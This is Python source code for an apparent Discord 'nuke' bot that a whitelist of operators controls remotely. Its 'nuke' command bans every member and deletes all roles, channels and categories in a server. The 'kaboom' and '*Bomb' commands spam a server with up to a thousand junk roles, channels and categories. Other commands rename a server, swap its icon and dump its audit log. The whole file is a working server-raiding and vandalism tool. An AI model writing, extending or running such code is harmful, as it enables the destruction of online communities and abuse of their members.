# discord
import discord
from discord.ext import commands
# system
import asyncio
from random import random, choice
import sys
from json import load
import requests
import re
from io import BytesIO
from math import ceil
# style
if sys.platform == 'win32':
    try:
        from colorama import init
        init()
    except ImportError: 
        pass 
from lazyme.string import color_print

# Global vars
per_page = 15
commands_per_page = 5
number_of_bomb_default = 1000
sorted_commands = []
connected_server = None

# normal functions
def read_json():
    temp = None
    try:
        temp = load(open('default.json'))
    except:
        uinput = input('Config file: ')
        try:
            temp = load(open(uinput))
        except:
            color_print('\nCannot read: ' + uinput, color='red')
            sys.exit(0)
    try:
        return temp['token'], temp['permissions'], temp['bomb_messages'], str(temp['bot_permission']), temp['after']
    except:
        color_print('Missing file args.')
base64_char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/'
def random_ascii(n):
    return ''.join(choice(base64_char) for _ in range(n))

def fix_messages(s):
    return s[int(random() * len(s))]

def check_type(type_):
    if type_ == 'random':
        type_ = random_ascii
        argv = 'random'
    elif type_ == 'fixed':
        type_ = fix_messages
        argv = 'fixed'
    return type_, argv

def check_perms(ctx):
    # for perm in permissions:
    if f'{ctx.author.name}#{ctx.author.discriminator}' in permissions:
        return True
    color_print(f'{ctx.author} tried to command "{ctx.message.content}" in channel "{ctx.message.channel.name}".', color='red')
    return False

def contain(container, obj):
    for o in container:
        if o.name.lower() == obj.lower() or str(o.id) == obj or f'<@!{str(o.id)}>' == obj:
            return o
    color_print('Unable to find ' + obj, color='yellow')
    return None

def add_args(a, b):
    if b is not None:
        return f'{a} {b}'
    return a

async def embed_page(ctx, n, list_, count_name, embed_title, embed_color):
    names = ''
    ids = ''

    if (n := n - 1) < 0:
        return await ctx.send('Invalid page number.')

    item_length = len(list_)
    if item_length == 0:
        return await ctx.send(count_name + ' count: 0')
    init_item = n * per_page
    page_max = ceil(item_length / per_page)
    if init_item > item_length - per_page:
        if init_item > item_length:
            return await ctx.send('Invalid page number.')
        final_item = init_item + (item_length % per_page)
    else:
        final_item = init_item + per_page
    
    for i in range(init_item, final_item, 1):
        obj = list_[i]
        names += f'{obj.name} \n'
        ids += f'{obj.id} \n'

    embed = discord.Embed(
        title = embed_title,
        description = 'Total count: ' + str(item_length),
        color = embed_color
    )

    embed.add_field(name='Name', value=names, inline=True)
    embed.add_field(name='ID', value=ids, inline=True)
    embed.set_footer(text=f'{n+1}/{page_max}')
    await ctx.send(embed=embed)

def check_server(ctx):
    if connected_server is None:
        return ctx, False
    return connected_server, True

def connect_server(ctx, path):
    temp_ctx, connected = check_server(ctx)
    if ctx.guild is not None:
        if (hasattr(temp_ctx, 'guild') and ctx.guild.id == temp_ctx.guild.id) or (ctx.guild.id == temp_ctx.id):
            return ctx
        
    if connected:
        global hero
        ctx_checked = hero()
        i = 0
        if path is None:
            return temp_ctx

        path_length = len(path)
        for i in range(len(path)):
            if i == path_length - 1:
                setattr(ctx_checked, path[i], temp_ctx)
            else:
                setattr(ctx_checked, path[i], None)
    else:
        ctx_checked = ctx
    return ctx_checked

class hero:
    pass

#set up events ===============
token, permissions, bomb_messages, bot_permission, after_attack = read_json()
client = commands.Bot(command_prefix='.', case_insensitive=True)
client.remove_command('help')

@client.event
async def on_ready():
    global sorted_commands 
    sorted_commands = sorted(client.commands, key=lambda e: e.name[0])
    color_print('Bot ready.', color='green')
    color_print('Logged in as', color='pink')
    print(client.user.name)
    print(client.user.id)
    color_print('Permission given to ', color='pink')
    for permission in permissions:
        print(permission)
    color_print(f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={bot_permission}&scope=bot', color='pink')
    print('------')

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        color_print(f'That command doesn\'t exist.', color='pink')
        return
    try:
        color_print(error, color='yellow')
    except:
        raise error

# commands

# help command

@client.command(name='h', description='Display all the commands. args: [Optional: type: all/names/command: default=names] [Optional: n: n of page]')
@commands.check(check_perms)
async def h(ctx, s='names', n=1):
    if (n := n - 1) < 0:
        return await ctx.send('Invalid page number.')

    item_length = len(sorted_commands)
    if item_length == 0:
        return await ctx.send('Error in commands.')
    init_item = n * commands_per_page
    page_max = ceil(item_length / commands_per_page)
    if init_item > item_length - commands_per_page:
        if init_item > item_length:
            return await ctx.send('Invalid page number.')
        final_item = init_item + (item_length % commands_per_page)
    else:
        final_item = init_item + commands_per_page

    helptext = '```'

    embed = discord.Embed(
        title = 'Commands',
        description = 'Total count: ' + str(item_length),
        color = discord.Color.green()
    )
    
    if s.lower() == 'all':
        i = 0
        for command in sorted_commands:
            if i < init_item:
                i += 1
                continue
            helptext += f'[{command.name}]: {command.description}\n\n'
            if i >= final_item - 1:
                break
            i += 1
        embed.set_footer(text=f'{n+1}/{page_max}')
    elif s.lower() == 'names':
        for command in sorted_commands:
            helptext += f'[{command.name}] '
    else:
        if len(s) > 20:
            s = '<this>'
        helptext = f'```Command {s} doesn\'t exist.'
        for command in sorted_commands:
            if command.name.lower() == s.lower():
                helptext = f'```[{command.name}]: {command.description}'
                break

    helptext += '```'
    
    embed.add_field(name='Name', value=helptext, inline=False)
    await ctx.send(embed=embed)

@client.command(description='Connect or change connection to a given server. Can be used for remotely control the bot. args: [name: name/ID]')
@commands.check(check_perms)
async def connect(ctx, s, *, s1=None):
    s = add_args(s, s1)
    temp = contain(client.guilds, s)
    if temp is not None:
        global connected_server
        if connected_server is None or connected_server.id is not temp.id:
            connected_server = temp
            color_print(f'Successfully connected to {s}.', color='pink')
            return await ctx.send(f'Successfully connected to {s}.')
        color_print('Already connect to ' + s, color='yellow')
        return await ctx.send('Already connected to ' + s)
    else:
        color_print(f'You did not add the to {s} server.', color='red')
        await ctx.send(f'You did not add the bot to {s} server.')

@client.command(description='Show the name of the server that the bot is currently connecting to.')
@commands.check(check_perms)
async def connecting(ctx):
    temp_ctx, connected = check_server(ctx)
    if connected:
        return await ctx.send(f'Connected to "{temp_ctx.name}".')
    return await ctx.send('Not connected to any server.')

@client.command(description='Disconnect the bot from the established connection. This can help with the performance of the bot\'s reaction speed, if you only want to use the bot inside a server.')
@commands.check(check_perms)
async def disconnect(ctx):
    temp_ctx, connected = check_server(ctx)
    if connected:
        global connected_server
        connected_server = None
        color_print('Finished disconnecting from ' + temp_ctx.name, color='green')
        await ctx.send('Finished disconnecting from ' + temp_ctx.name)
    else:
        await ctx.send('The bot is already disconnected.')

@client.command(description='Nuking everything inside this server. "after" option can be configured in the json.')
@commands.check(check_perms)
async def nuke(ctx):
    async def after(ctx):
        for command in after_attack:
            call = globals()[command[0]]
            temp = len(command)
            if temp == 2:
                await call(ctx, command[1])
                continue
            elif temp == 3:
                await call(ctx, command[1], command[2])
                continue
            await call(ctx)

    tasks = [dAllRoles(ctx), banAll(ctx), dAllChannels(ctx), dAllCat(ctx), after(ctx)]
    await asyncio.get_event_loop().run_until_complete(asyncio.gather(*tasks))

@client.command(description='Clears current chat. args: [n: number of items]')
@commands.check(check_perms)
async def clear(ctx, n=None):
    try:
        if n is not None:
            s = 'up to ' + str(n) # to make sure n is a string
            n = int(n)
        else:
            s = 'all'
        await ctx.channel.purge(limit=n)
        color_print(f'Successfully cleared {s} message(s) in the current chat.', color='green')
    except:
        color_print('Unable to clear the current chat.', color='yellow')

@client.command(description='Ban all members in the current server.')
@commands.check(check_perms)
async def banAll(ctx):
    ctx_checked = connect_server(ctx, ['guild'])
    for member in ctx_checked.guild.members:
        await ban(ctx, str(member.id))

@client.command(description='Kick one member with a given ID/ping. args: [member: ID/ping]')
@commands.check(check_perms)
async def kick(ctx, member):
    ctx_checked = connect_server(ctx, ['guild'])
    member = contain(ctx_checked.guild.members, member)

    try:
        await member.kick(reason=None)
        color_print(f'Kicked: {member.name}#{member.discriminator}', color='white')
    except:
        color_print(f'Failed to Kick: {member.name}#{member.discriminator}', color='red')

@client.command(description='Ban one member with a give ID/ping. args: [member: ID/ping/]')
@commands.check(check_perms)
async def ban(ctx, member):
    ctx_checked = connect_server(ctx, ['guild'])
    member = contain(ctx_checked.guild.members, member)

    try:
        await member.ban(reason=None)
        color_print(f'Banned: {member.name}#{member.discriminator}', color='white')
    except:
        color_print(f'Failed to ban: {member.name}#{member.discriminator}', color='red')

@client.command(description='List all the banned members.')
@commands.check(check_perms)
async def bans(ctx, n=1):
    ctx_checked = connect_server(ctx, ['guild'])
    banned_list = [s.user for s in await ctx_checked.guild.bans()]
    await embed_page(ctx, n, banned_list, 'Ban list', 'Bans', discord.Color.red())

@client.command(description='Rename the server. args: *->[name: string]')
@commands.check(check_perms)
async def sn(ctx, s, *, s1=None):
    ctx_checked = connect_server(ctx, ['guild'])
    if s1 is not None:
        s += ' ' + s1
    try:
        await ctx_checked.guild.edit(name=s)
        print('Server name changed to: ' + s)
    except:
        color_print('Unable to change server name.', color='yellow')

@client.command(description='Change the current server icon with a link or host\'s image file. args: [None: delete the current icon: image_link: URL: File_Path: Path]')
@commands.check(check_perms)
async def si(ctx, path=None):
    ctx_checked = connect_server(ctx, ['guild'])
    # https://regex101.com/
    regex = r'((http|fpt)s?:\/\/)|(([0-9A-Za-z]{1,256}.)?)+'
    if path is None: # remove icon
        await ctx_checked.guild.edit(icon=None)
        return color_print('Successfully removed the current server icon.', color='green')
    elif re.search(regex, path) is not None: # Link EX: https://www.example.com/aaa.png
        try:
            response = requests.get(path)
            img = BytesIO(response.content).read()
            await ctx_checked.guild.edit(icon=img)
            color_print('Successfully changed the current server icon.', color='green')
        except:
            color_print('Bad image URL.', color='yellow')

    else: # File EX: C:\Users\user\Desktop\something.jpg or EX: .\icon\something.jpg
        try:
            with open(path, 'rb') as data:
                await ctx_checked.guild.edit(icon=data.read())
                color_print('Successfully removed the current server icon.', color='green')
        except:
            color_print('Bad path to image.', color='yellow')

@client.command(description='Give a list of servers with names and ID that the bot is currently in.')
@commands.check(check_perms)
async def servers(ctx, n=1):
    await embed_page(ctx, n, client.guilds, 'Server', 'Servers', discord.Color.purple())

@client.command(description='Leave the given server. args: [server_name: name/ID]')
@commands.check(check_perms)
async def leave(ctx, guild='the server.', *, guild1=None):
    if guild1 is not None:
        guild += ' ' + guild1
    guild = contain(client.guilds, guild)
    if guild is None:
        try:
            await ctx.guild.leave()
            color_print(f'Left {ctx.guild.name} successfully.', color='green')
        except:
            color_print('The bot is not in this server.', color='red')
        return
    try:
        await guild.leave()
        color_print(f'Left {guild.name} successfully.', color='green')
    except:
        color_print('Unable to leave the server.', color='red')

@client.command(description='Leave all the servers that the bot is currently in.')
@commands.check(check_perms)
async def leaveAll(ctx):
    for guild in client.guilds:
        await guild.leave()

@client.command(description='Output a file contains a list of audit log in the current server to the host. args: [Path to file: default path=./guild.name_guild.id.txt] [n of items from the audit list: default=None=All_items]')
@commands.check(check_perms)
async def auditLog(ctx, file=None, n=None):
    ctx_checked = connect_server(ctx, ['guild'])
    if file is None:
        file = f'audit_logs_{ctx_checked.guild.name}_{ctx_checked.guild.id}.txt'
    if n is not None:
        n = int(n)
        if n < 1:
            return await ctx.send('Invaild item number.')
    color_print('Getting everything in audit log ready...', color='pink')
    with open(file, 'w+') as f:
        counter = 0
        async for entry in ctx_checked.guild.audit_logs(limit=n):
            counter += 1
            action = entry.action.name
            if hasattr(entry.target, 'discriminator'):
                f.write(f'{entry.user} did {action} to {entry.target.name}#{entry.target.discriminator} id={entry.target.id}\n')
            elif hasattr(entry.target, 'name'):
                f.write(f'{entry.user} did {action} to {entry.target.name} id={entry.target.id}\n')
            else:
                f.write(f'{entry.user} did {action} to guild_name={entry.guild.name} id={entry.guild.id}\n')

            #f.write('{0.user} did {0.action} to {0.target}\n'.format(entry))

    color_print(f'Finished saving audit log with {str(counter)} item(s).', color='green')

@client.command(description='Ignore all executions. Used for shutting down or turning off the bot.')
@commands.check(check_perms)
async def off(ctx):
    print('Exiting...')
    await ctx.bot.logout()

# BOMBS============================

@client.command(description=f'All bombs blow up at once. args: [n: number of bombs: default={number_of_bomb_default}] [type: random/fixed: config in json]')
@commands.check(check_perms)
async def kaboom(ctx, n=number_of_bomb_default, type_='random'):
    tasks = [roleBomb(ctx, n, type_), channelBomb(ctx, n, type_), catBomb(ctx, n, type_)]
    await asyncio.get_event_loop().run_until_complete(asyncio.gather(*tasks))

@client.command(description=f'Adding n of roles. args: [n: number of bombs: default={number_of_bomb_default}] [type: random/fixed: config in json]')
@commands.check(check_perms)
async def roleBomb(ctx, n=number_of_bomb_default, type_='random'):
    type_, argv = check_type(type_)
    color_print('Role bombing...', color='pink')

    for _ in range(n):
        temp = await aRole(ctx, type_(bomb_messages[argv]))
        if temp:
            return

    color_print('Role bombing, successful.', color='green')

@client.command(description=f'Adding n of channels. args: [n: number of bombs: default={number_of_bomb_default}] [type: random/fixed: config in json]')
@commands.check(check_perms)
async def channelBomb(ctx, n=number_of_bomb_default, type_='random'):
    type_, argv = check_type(type_)

    color_print('Channel bombing...', color='pink')
    for _ in range(n):
        temp = await aChannel(ctx, type_(bomb_messages[argv]))
        if temp:
            color_print('Permission issues...', color='yellow')
            return

    color_print('Channel bombing, successful.', color='green')

@client.command(description=f'Adding n of categories. args: [n: number of bombs: default={number_of_bomb_default}] [type: random/fixed: config in json]')
@commands.check(check_perms)
async def catBomb(ctx, n=number_of_bomb_default, type_='random'):
    type_, argv = check_type(type_)
    color_print('Category bombing...', color='pink')
    for _ in range(n):
        temp = await aCat(ctx, type_(bomb_messages[argv]))
        if temp:
            color_print('Permission issues...', color='yellow')
            return

    color_print('Category bombing, successful.', color='green')

# roles=

@client.command(description='Add one role to the current server. args: *->[s: name/ID] [admin: T/F: defualt: F]')
@commands.check(check_perms)
async def aRole(ctx, s, *, s1=None):
    ctx_checked = connect_server(ctx, ['guild'])

    if s1 is not None:
        s += ' ' + s1
    elif (admin := s[-2:]) == ' t':
        s = s[:-2]
        admin = True
    else:
        admin = False
    try: 
        perms = discord.Permissions(administrator=admin)
        await ctx_checked.guild.create_role(name=s, permissions=perms)
    except:
        color_print(f'Couldn\'t add role {s}. Permission issues...', color='yellow')
        return True
    print('Role ' + s + ' is added to the server.')
    return False

@client.command(description='Delete the given role in the server. args: [role: name/ID]')
@commands.check(check_perms)
async def dRole(ctx, role):
    ctx_checked = connect_server(ctx, ['guild'])
    
    role = contain(ctx_checked.guild.roles, role)

    if role is None:
        return color_print('Unable to find role: ' + role, color='yellow')
    try: 
        await role.delete(reason=None)
        color_print('Deleted role: ' + role.name, color='white')
    except:
        color_print('Failed to delete role: ' + role.name, color='red')

@client.command(description='Delete all roles in the current server.')
@commands.check(check_perms)
async def dAllRoles(ctx):
    ctx_checked = connect_server(ctx, ['guild'])
    print('asdf')
    for role in ctx_checked.guild.roles:
        await dRole(ctx, str(role.id))

@client.command(description='List 15 roles per page in the current server. args: [n: n of pages: default: n=1]')
@commands.check(check_perms)
async def roles(ctx, n=1):
    ctx_checked = connect_server(ctx, ['guild'])

    role_names = ''
    role_id = ''

    if (n := n - 1) < 0:
        return await ctx.send('Invalid page number.')

    item_length = len(ctx_checked.guild.roles)
    if item_length == 0:
        return await ctx.send('Roles count: 0')
    init_item = n * per_page
    page_max = ceil(item_length / per_page)
    final_item = init_item + per_page
    if init_item > item_length - per_page:
        if init_item > item_length:
            return await ctx.send('Invalid page number.')
        final_item = init_item + (item_length % per_page)
    else:
        final_item = init_item + per_page

    # <@&id> to list the role without ping
    # \@rolename to get role id

    if ctx is not ctx_checked:
        ping_name = False
    else:
        ping_name = True

    for i in range(init_item, final_item, 1):
        role = ctx_checked.guild.roles[i]
        if ping_name:
            role_names += f'<@&{role.id}> \n'
        else:
            role_names += f'{role.name} \n'
        role_id += f'{role.id} \n'

    embed = discord.Embed(
        title = 'Roles',
        description = 'Total count: ' + str(item_length),
        color = discord.Color.green()
    )
    
    embed.add_field(name='Name', value=role_names, inline=True)
    embed.add_field(name='ID', value=role_id, inline=True)
    embed.set_footer(text=f'{n+1}/{page_max}')
    await ctx.send(embed=embed)

@client.command(description='Give role to a given member. If the member already has the role, then the bot will remove the role. args: [member: name/ID] [role: name/ID]')
@commands.check(check_perms)
async def roleTo(ctx, member_name, role_name):
    ctx_checked = connect_server(ctx, ['guild'])
    member = contain(ctx_checked.guild.members, member_name)
    role = contain(ctx_checked.guild.roles, role_name)

    if member is None or role is None:
        color_print(f'Unable to add {role} to {member_name}')
    try:
        if role in member.roles:
            await member.remove_roles(role)
        else:
            await member.add_roles(role)
    except Exception as e:
        color_print('Error no permission: ' + e, color='yellow')

#channels=

@client.command(description='List 15 channels and VC per page in the current server. args: [n: n of pages: default: n=1]')
@commands.check(check_perms)
async def channels(ctx, n=1):
    #Special case handler
    ctx_checked = connect_server(ctx, ['guild'])
    temp = []

    if (n := n - 1) < 0:
        await ctx.send('Invalid page number.')
        return

    for channel in ctx_checked.guild.channels:
        repeat = False
        for category in ctx_checked.guild.categories:
            if category.id == channel.id:
                repeat = True
                break
        if repeat:
            continue
        temp.append(channel)

    channel_names = ''
    channel_id = ''

    item_length = len(temp)
    if item_length == 0:
        return await ctx.send('Channels count: 0')
    init_item = n * per_page
    page_max = ceil(item_length / per_page)
    final_item = init_item + per_page
    if init_item > item_length - per_page:
        if init_item > item_length:
            await ctx.send('Invalid page number.')
            return
        final_item = init_item + (item_length % per_page)
    else:
        final_item = init_item + per_page

    for i in range(init_item, final_item, 1):
        channel = temp[i]
        channel_names += f'{channel.name} \n'
        channel_id += f'{str(channel.id)} \n'

    embed = discord.Embed(
        title = 'Channels and VC',
        description = 'Total count: ' + str(item_length),
        color = discord.Color.blue()
    )
    
    embed.add_field(name='Name', value=channel_names, inline=True)
    embed.add_field(name='ID', value=channel_id, inline=True)
    embed.set_footer(text=f'{n+1}/{page_max}')
    await ctx.send(embed=embed)

@client.command(description='Delete all channels and VC.')
@commands.check(check_perms)
async def dAllChannels(ctx):
    ctx_checked = connect_server(ctx, ['guild'])

    for channel in ctx_checked.guild.channels:
        repeat = False
        for category in ctx_checked.guild.categories:
            if category.id == channel.id:
                repeat = True
                break
        if repeat:
            continue
        await dChannel(ctx_checked.guild, channel, False)

@client.command(description='Delete the given channel/VC in the server. args: [channel: name/ID]')
@commands.check(check_perms)
async def dChannel(ctx, channel, do_check=True):
    if do_check:
        ctx_checked = connect_server(ctx, ['guild'])
        channel = contain(ctx_checked.guild.channels, channel)
        print('shiting')

    try:
        await channel.delete(reason=None)
        print(f'Channel: {channel.name} is deleted.')
    except:
        color_print('Unable to delete channel: ' + channel.name, color='yellow')

@client.command(description='Delete the given voice channel in the server. args: [VC: name/ID]')
@commands.check(check_perms)
async def dVC(ctx, s):
    ctx_checked = connect_server(ctx, None)
    channel = contain(ctx_checked.channels, s)

    try:
        await channel.delete()
        print('VC: ' + channel.name + ' is deleted.')
    except:
        color_print('Unable to delete VC: ' + channel.name, color='yellow')

@client.command(description='Add a channel with given name to a category(Optional). args: [s: string] [Optional: category: name/ID]')
@commands.check(check_perms)
async def aChannel(ctx, s, category=None, *, category1=None):
    category = add_args(category, category1)
    ctx_checked = connect_server(ctx, ['guild'])

    if category is not None:
        category = contain(ctx_checked.guild.categories, category)
        if category is None:
            return color_print('Unable to find category: ' + category, color='yellow')

    try:
        await ctx_checked.guild.create_text_channel(s, category=category)
        if category is None:
            category = 'No category.'
        print('Successfully added channel: ' + s)
    except:
        color_print('Unable to add: channel: ' + s, color='yellow')

@client.command(description='Add a voice channel with given name to a category(Optional). args: [s: string] [Optional: category: name/ID]')
@commands.check(check_perms)
async def aVC(ctx, s, category=None, *, category1=None):
    ctx_checked = connect_server(ctx, ['guild'])
    category = add_args(category, category1)

    if category is not None:
        category = contain(ctx_checked.guild.categories, category)
        if category is None:
            return color_print('Unable to find category: ' + category, color='yellow')

    try:
        await ctx_checked.guild.create_voice_channel(s, category=category)
        if category is None:
            category = 'No category.'
        else:
            category = category.name
        print(f'Successfully added VC: {s} to category: {category}')
    except:
        color_print('Unable to add: VC: ' + s, color='yellow')

#categories=

@client.command(description='Delete a category in the current server. args: [category: name/ID] [Optional: reason]')
@commands.check(check_perms)
async def dCat(ctx, s, *, s1=None):
    add_args(s, s1)
    ctx_checked = connect_server(ctx, ['guild'])
    category = contain(ctx_checked.guild.categories, s)
    try:
        await category.delete(reason=None)
        print('Successfully deleted category: ' + category.name)
    except:
        color_print('Unable to delete category: ' + category.name, color='yellow')

@client.command(description='Add a category in the current server. args: [name: string]')
@commands.check(check_perms)
async def aCat(ctx, name, *, name1=None):
    ctx_checked = connect_server(ctx, ['guild'])
    name = add_args(name, name1)
    try:
        await ctx_checked.guild.create_category(name)
        print('Successfully created category: ' + name)
    except:
        color_print('Unable to create category: ' + name, color='yellow')

@client.command(description='Delete all categories.')
@commands.check(check_perms)
async def dAllCat(ctx):
    ctx_checked = connect_server(ctx, ['guild'])
    for category in ctx_checked.guild.categories:
        await dCat(ctx, str(category.id))

@client.command(description='List 15 categories per page in the current server. args: [n: n of pages: default: n=1]')
@commands.check(check_perms)
async def categories(ctx, n=1):
    ctx_checked = connect_server(ctx, ['guild'])
    await embed_page(ctx, n, ctx_checked.guild.categories, 'Category', 'Categories', discord.Color.red())
        

try:
    client.run(token)
except Exception as e:
    print('ERROR: ' + e)
